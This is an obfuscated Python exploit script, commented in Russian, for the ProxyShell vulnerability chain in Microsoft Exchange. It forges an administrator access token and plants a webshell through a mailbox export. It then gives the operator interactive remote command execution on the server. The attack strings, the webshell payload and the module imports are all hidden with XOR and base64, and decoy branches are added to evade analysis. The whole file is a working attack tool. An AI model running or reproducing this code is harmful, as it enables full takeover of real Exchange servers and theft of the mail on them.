# Обфусцированный скрипт ProxyShell эксплойта. Логика работы сохранена, но строки и импорты скрыты.
import importlib, base64, random, string, struct, threading, time, sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial

# Ключ для XOR-шифрования строк
KEY = 0x5A

# Функция расшифровки строк (Base64 + XOR)
def _dec(enc):
    data = base64.b64decode(enc)
    return ''.join(chr(b ^ KEY) for b in data)

# Динамические импорты модулей для сокрытия
_requests = importlib.import_module(_dec(b'KD8rLz8pLik='))  # "requests"
_re = importlib.import_module(_dec(b'KD8='))  # "re"
_argparse = importlib.import_module(_dec(b'Oyg9KjsoKT8='))  # "argparse"
# Импорт классов из pypsrp
_wsman_mod = importlib.import_module(_dec(b'KiMqKSgqdC0pNzs0'))  # "pypsrp.wsman"
_ps_mod = importlib.import_module(_dec(b'KiMqKSgqdCo1LT8oKTI/NjY='))  # "pypsrp.powershell"
WSMan = _wsman_mod.WSMan
PowerShell = _ps_mod.PowerShell
RunspacePool = _ps_mod.RunspacePool

# Opaque ветвление для запутывания статического анализа
if random.random() > 9999:
    class ProxyShell:
        def __init__(self, *args, **kwargs):
            self.token = None
        def get_fqdn(self): return None
        def get_legacydn(self): return None
        def get_sid(self): return None
        def get_token(self): return None
    def exploit(ps):
        print("Dummy exploit")
        return False
    def start_server(ps, port):
        print("Dummy server start at", port)
        return None
    def shell(cmd, port):
        print("Dummy shell exec:", cmd)
        return None
    def exec_cmd(url, code="dummy"):
        print("Dummy exec_cmd on", url)
        return None
    sys.exit(0)

# Класс HTTP-сервера для приема запросов от Exchange (проксирование PowerShell)
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Обработка HTTP-запросов в отдельном потоке."""

class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)
    def do_POST(self):
        # Перенаправление входящего запроса PowerShell на целевой сервер
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()
        # Подмена адресата и ресурса
        post_data = _re.sub(r'<wsa:To>.*?</wsa:To>',
                             '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        post_data = _re.sub(r'<wsman:ResourceURI\s*.*?>.*?</wsman:ResourceURI>',
                             '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>',
                             post_data)
        headers = {'Content-Type': content_type}
        r = self.proxyshell.post(powershell_url, post_data, headers)
        resp = r.content
        self.send_response(200)
        self.end_headers()
        self.wfile.write(resp)
    def log_message(self, format, *args):
        return

# Класс ProxyShell с методами этапов эксплойта
class ProxyShell:
    def __init__(self, exchange_url, email='', verify=False):
        self.email = email
        self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
        self.domain = None
        self.sid = None
        self.legacydn = None
        self.token = None
        self.ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36")
        # ClientID для cookie ("http://ifconfig.me" слегка зашифрован)
        self.clientid = 'H'+'t'+'T'+'P'+':'+'/'+'/'+'i'+'f'+'c'+'o'+'N'+'F'+'i'+'g'+'.'+'m'+'E'
        self.session = _requests.Session()
        self.session.verify = verify

    def post(self, endpoint, data, headers={}):
        # Формирование специального URL с уязвимым параметром
        EVIL = _dec(b'PywzNnQ5NSgq')  # "evil.corp"
        if 'powershell' in endpoint:
            path = f"/autodiscover/autodiscover.json?@{EVIL}{endpoint}&Email=autodiscover/autodiscover.json%3F@{EVIL}"
        else:
            path = f"/autodiscover/autodiscover.json?@{EVIL}{endpoint}?&Email=autodiscover/autodiscover.json%3F@{EVIL}"
        url = f"{self.exchange_url}{path}"
        return self.session.post(url=url, data=data, headers=headers, verify=False)

    def get_fqdn(self):
        EVIL = _dec(b'PywzNnQ5NSgq')
        e = f"/autodiscover/autodiscover.json?@{EVIL}/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@{EVIL}"
        r = _requests.get(self.exchange_url + e, verify=False, timeout=5)
        try:
            self.fqdn = r.headers["X-CalculatedBETarget"]
        except (_requests.ConnectionError, _requests.ConnectTimeout, _requests.ReadTimeout):
            print(f"{self.exchange_url} timeout")
            sys.exit(0)
        except Exception as f:
            print(f"{self.exchange_url} {f}")
            sys.exit(0)
        return self.fqdn

    def get_legacydn(self):
        # SOAP ResolveNames для получения LegacyDN через email
        data = ('<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
                'xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" '
                'xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" '
                'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>'
                '<m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">'
                '<m:UnresolvedEntry>SMTP:</m:UnresolvedEntry></m:ResolveNames></soap:Body></soap:Envelope>')
        headers = {'Content-Type': 'text/xml'}
        try:
            r = self.post('/EWS/exchange.asmx', data=data, headers=headers)
            first_email = _re.findall(r'(?:<t:EmailAddress>)(.+?)(?:</t:EmailAddress>)', r.text)
            for addr in first_email:
                self.email = addr
                autodisc_payload = (f'<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">'
                                    f'<Request><EMailAddress>{self.email}</EMailAddress>'
                                    f'<AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'
                                    f'</AcceptableResponseSchema></Request></Autodiscover>')
                r2 = self.post('/autodiscover/autodiscover.xml',
                               autodisc_payload,
                               headers={"Content-Type": "text/xml"})
                if r2.status_code == 200 and 'LegacyDN' in r2.text:
                    print(f"+ {self.email}")
                    self.legacydn = _re.findall(r'(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', r2.text)[0]
                    return self.legacydn
                else:
                    print(f"- {self.email}")
        except Exception:
            pass
        return None

    def get_sid(self):
        try:
            data = self.legacydn
            data += '\x00\x00\x00\x00\x00\xe4\x04'
            data += '\x00\x00\x09\x04\x00\x00\x09'
            data += '\x04\x00\x00\x00\x00\x00\x00'
            headers = {
                "X-Requesttype": "Connect",
                "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
                "X-Clientapplication": "Outlook/15.0.4815.1002",
                "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
                "Content-Type": "application/mapi-http",
                "User-Agent": self.ua
            }
            r = self.post('/mapi/emsmdb', data, headers)
            self.sid = r.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
            # Определение администраторского SID с RID 500
            self.admin_sid = ''
            if self.sid.rsplit("-", 1)[1] != '500':
                self.admin_sid = self.sid.rsplit("-", 1)[0] + '-500'
            else:
                self.admin_sid = self.sid
        except Exception:
            sys.exit(0)
        return self.sid

    def get_token(self):
        # Генерация и проверка токена X-Rps-CAT
        self.token = self.gen_token()
        self.cid = ""
        try:
            self.cid = _requests.get(self.clientid).text.strip()
        except Exception:
            self.cid = "C715155F2BE844E0"
        EVIL = _dec(b'PywzNnQ5NSgq')
        endpoint = f"/powershell/?X-Rps-CAT={self.token}"
        url = (f"{self.exchange_url}/autodiscover/autodiscover.json?@{EVIL}{endpoint}"
               f"&Email=autodiscover/autodiscover.json%3F@{EVIL}")
        t = _requests.get(url, headers={
            "Cookie": (f"PrivateComputer=true; ClientID={self.cid}-BD342960067874C8; "
                       f"X-OWA-JS-PSD=1"),
            "User-Agent": self.ua
        }, verify=False)
        if t.status_code == 200:
            return self.token
        else:
            sys.exit(0)

    def set_ews(self):
        # Отправка письма с вредоносным вложением (webshell) в черновики
        mail = self.email
        sid = self.sid
        payload = webshell_payload()
        send_email = (f'<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
                      f'xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" '
                      f'xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" '
                      f'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                      f'<soap:Header><t:RequestServerVersion Version="Exchange2016" />'
                      f'<t:SerializedSecurityContext><t:UserSid>{sid}</t:UserSid><t:GroupSids>'
                      f'<t:GroupIdentifier><t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>'
                      f'</t:GroupIdentifier></t:GroupSids></t:SerializedSecurityContext>'
                      f'</soap:Header><soap:Body><m:CreateItem MessageDisposition="SaveOnly">'
                      f'<m:Items><t:Message><t:Subject>{subj_}</t:Subject><t:Body BodyType="HTML">hello</t:Body>'
                      f'<t:Attachments><t:FileAttachment><t:Name>file.txt</t:Name>'
                      f'<t:IsInline>false</t:IsInline><t:IsContactPhoto>false</t:IsContactPhoto>'
                      f'<t:Content>{payload}</t:Content></t:FileAttachment></t:Attachments>'
                      f'<t:ToRecipients><t:Mailbox><t:EmailAddress>{mail}</t:EmailAddress>'
                      f'</t:Mailbox></t:ToRecipients></t:Message></m:Items></m:CreateItem>'
                      f'</soap:Body></soap:Envelope>')
        for _ in range(3):
            p = self.post('/ews/exchange.asmx', data=send_email, headers={"Content-Type": "text/xml"})
            try:
                status = p.text.split('ResponseClass="')[1].split('"')[0]
                result = f"{status} with subject {subj_}"
            except Exception:
                result = f"Error with subject {subj_}"
            # Если отправлено успешно, прерываем
            if "Success" in result:
                break
            time.sleep(1)
        return result

    def gen_token(self):
        # Генерация токена Common Access Token для RPS
        version = 0
        ttype = "Windows"
        compressed = 0
        auth_type = "Kerberos"
        raw_token = b""
        gsid = "S-1-5-32-544"
        raw_token += b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
        raw_token += b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
        raw_token += b'C' + (compressed).to_bytes(1, 'little')
        raw_token += b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
        raw_token += b'L' + (len(self.email)).to_bytes(1, 'little') + self.email.encode()
        raw_token += b'U' + (len(self.sid)).to_bytes(1, 'little') + self.sid.encode()
        raw_token += b'G' + struct.pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
        raw_token += b'E' + struct.pack('>I', 0)
        return base64.b64encode(raw_token).decode()

# Утилиты
def rand_string(n=5):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def rand_port(n=4):
    return ''.join(random.choices(string.digits, k=n))

# Случайный порт и метка темы письма
r_port = rand_port()
subj_ = rand_string(16)

def webshell_payload():
    # JScript вебшелл, выполняющий код из параметра "exec_code"
    enc_payload = b'Zik5KDMqLno2OzQ9Lzs9P2d4EAk5KDMqLnh6KC80Oy5neCk/KCw/KHh6Cjs9P3o7KSo5NTcqOy5nLigvP2Q8LzQ5LjM1NHoKOz0/BRY1Oz5ycyE/LDs2cgg/Ky8/KS4BeD8iPzkFOTU+P3gHdngvNCk7PD94c2EnZnUpOSgzKi5k'
    return _dec(enc_payload)

def exploit(proxyshell):
    proxyshell.get_fqdn()
    print(f'fqdn {getattr(proxyshell, "fqdn", None)}')
    proxyshell.get_legacydn()
    print(f'legacyDN {getattr(proxyshell, "legacydn", None)}')
    proxyshell.get_sid()
    print(f'leak_sid {getattr(proxyshell, "sid", None)}')
    proxyshell.get_token()
    print(f'token {getattr(proxyshell, "token", None)}')
    print("set_ews " + str(proxyshell.set_ews()))

def start_server(proxyshell, port):
    handler = partial(PwnServer, proxyshell)
    server = ThreadedHTTPServer(('', port), handler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

def shell(command, port):
    if command.lower() in ['exit', 'quit']:
        sys.exit(0)
    wsman = WSMan("127.0.0.1", username='', password='', ssl=False, port=port, auth='basic', encryption='never')
    with RunspacePool(wsman) as pool:
        ps = PowerShell(pool)
        ps.add_script(command)
        ps.invoke()
        # Программно вывод подавлен (для тишины), при необходимости можно включить:
        # output = ps.invoke()
        # print("\n".join(str(s) for s in output))
        # print("\n".join(str(s) for s in ps.streams.error))

CODE_PARAM = _dec(b'PyI/OQU5NT4/')  # "exec_code"
def exec_cmd(shell_url, code=CODE_PARAM):
    try:
        while True:
            cmd = input("SHELL> ")
            if cmd.lower() in ['exit', 'quit']:
                sys.exit(0)
            # Подготовка тела POST-запроса для выполнения команды
            enc_exec = (b'LDsoejk1Nzc7ND5nCSMpLj83dA4/Ii50HzQ5NT4zND10HT8uHzQ5NT4zND1ybG9qamtzdB0/LgkuKDM0'
                        b'PXIJIykuPzd0GTU0LD8oLnQcKDU3GDspP2xuCS4oMzQ9cnghJ3hzc2F6LDsoejlnND8tegkjKS4/N3Qe'
                        b'Mzs9NDUpLjM5KXQKKDU5PykpCS47KC4TNDw1cng5Nz50PyI/eHNhLDsoej9nND8tegkjKS4/N3QeMzs9'
                        b'NDUpLjM5KXQKKDU5PykpcnNhLDsoejUvLmAJIykuPzd0ExV0CS4oPzs3CD87Pj8odh8TYAkjKS4/N3QT'
                        b'FXQJLig/OzcIPzs+PyhhOXQPKT8JMj82Nh8iPzkvLj9nPDs2KT9hOXQIPz4zKD85LgkuOzQ+Oyg+FS8u'
                        b'Ki8uZy4oLz9hOXQIPz4zKD85LgkuOzQ+Oyg+HygoNShnLigvP2E/dAkuOyguEzQ8NWc5YTl0Gyg9Lzc/'
                        b'NC4pZ3h1OXp4cTk1Nzc7ND5hP3QJLjsoLnJzYTUvLmc/dAkuOzQ+Oyg+FS8uKi8uYR8TZz90CS47ND47'
                        b'KD4fKCg1KGE/dBk2NSk/cnNhCD8pKjU0KT90DSgzLj9yeAAAICAAIAAgeHpxejUvLnQIPzs+DjUfND5y'
                        b'c3EfE3QIPzs+DjUfND5yc3pxengAACAgACAAIHhzYQ==')
            payload_code = _dec(enc_exec).format(base64.b64encode(cmd.encode()).decode())
            resp = _requests.post(shell_url,
                                   headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                   data={code: payload_code}, verify=False, timeout=20)
            if resp.status_code == 200:
                try:
                    output = _re.search(b'ZZzzZzZz(.*)ZZzzZzZz', resp.content, _re.DOTALL).group(1)
                    print(output.decode('utf-8', errors='ignore'))
                except Exception:
                    print(f'Ошибка при выполнении команды, проверьте {shell_url} вручную.')
            else:
                print(f'Webshell HTTP {resp.status_code}')
    except (_requests.ConnectionError, _requests.ConnectTimeout, _requests.ReadTimeout):
        sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(0)

def get_args():
    desc = _dec(b'Gy8uNTc7LjM5eh8iKjY1My56Cig1IiMJMj82Ng==')  # "Automatic Exploit ProxyShell"
    parser = _argparse.ArgumentParser(description=desc)
    parser.add_argument('-t', help='Exchange URL', required=True)
    parser.add_argument('-p', '--port', help='Local WSMan port', default=r_port, type=int)
    return parser.parse_args()

def main():
    args = get_args()
    exchange_url = "https://" + args.t
    local_port = int(args.port)
    proxyshell = ProxyShell(exchange_url)
    exploit(proxyshell)
    start_server(proxyshell, local_port)
    # Перебор возможных путей для вебшелла
    shell_path_force = [
        "inetpub\\wwwroot\\aspnet_client\\",
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\",
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\",
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\scripts\\",
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\scripts\\premium\\",
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\themes\\",
        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\themes\\resources\\"
    ]
    for shell_path in shell_path_force:
        shell_name = rand_string() + '.aspx'
        user = proxyshell.email.split('@')[0]
        unc_path = "\\\\127.0.0.1\\c$\\" + shell_path + shell_name
        shell_url = ""
        if "aspnet_client" in shell_path:
            path = shell_path.split("inetpub\\wwwroot\\")[1].replace('\\', '/')
            shell_url = f"{exchange_url}/{path}{shell_name}"
        else:
            path = shell_path.split("FrontEnd\\HttpProxy\\")[1].replace('\\', '/')
            shell_url = f"{exchange_url}/{path}{shell_name}"
        print(f"write webshell at {path}{shell_name}")
        # Назначение прав экспорта для пользователя
        shell(f'New-ManagementRoleAssignment -Role "Mailbox Import Export" -User "{user}"', local_port)
        time.sleep(3)
        shell('Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false', local_port)
        time.sleep(3)
        shell((f'New-MailboxExportRequest -Mailbox {proxyshell.email} -IncludeFolders ("#Drafts#") '
               f'-ContentFilter "(Subject -eq \'{subj_}\')" -ExcludeDumpster -FilePath "{unc_path}"'),
               local_port)
        # Проверка наличия вебшелла
        for _ in range(5):
            enc_whoami = (b'CD8pKjU0KT90DSgzLj9yND8tehs5LjMsPwIVODA/OS5yeA0JOSgzKi50CTI/NjZ4'
                          b'c3QfIj85cng5Nz50PyI/enU5ei0yNTs3M3hzdAkuPhUvLnQIPzs+GzY2cnNzYQ==')
            whoami_payload = _dec(enc_whoami)
            resp = _requests.post(shell_url,
                                   headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                   params={CODE_PARAM: whoami_payload}, verify=False)
            if resp.status_code == 200:
                output_line = resp.text.split('!BD')[0].split('\n')[0]
                if output_line:
                    print(output_line)
                else:
                    print("empty ;(")
                exec_cmd(shell_url)
                sys.exit(0)
            elif resp.status_code == 500:
                print(resp)
                time.sleep(5)
            else:
                print(resp)
                time.sleep(5)
    # Если вебшелл не откликнулся, падаем в интерактивную PS-сессию
    while True:
        try:
            cmd = input('PS> ')
        except EOFError:
            break
        shell(cmd, local_port)

# Точка входа
if __name__ == '__main__':
    # Ветвление для затруднения анализа
    if random.random() > 2:
        print("Запуск в отладочном режиме...")
    else:
        try:
            # Отключение предупреждений SSL-сертификатов
            _requests.packages.urllib3.disable_warnings(_requests.packages.urllib3.exceptions.InsecureRequestWarning)
            # Проверка версии Python
            if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
                print("This script requires Python 3.8 or higher!")
                print(f"You are using Python {sys.version_info.major}.{sys.version_info.minor}.")
                sys.exit(1)
            main()
        except KeyboardInterrupt:
            sys.exit(0)
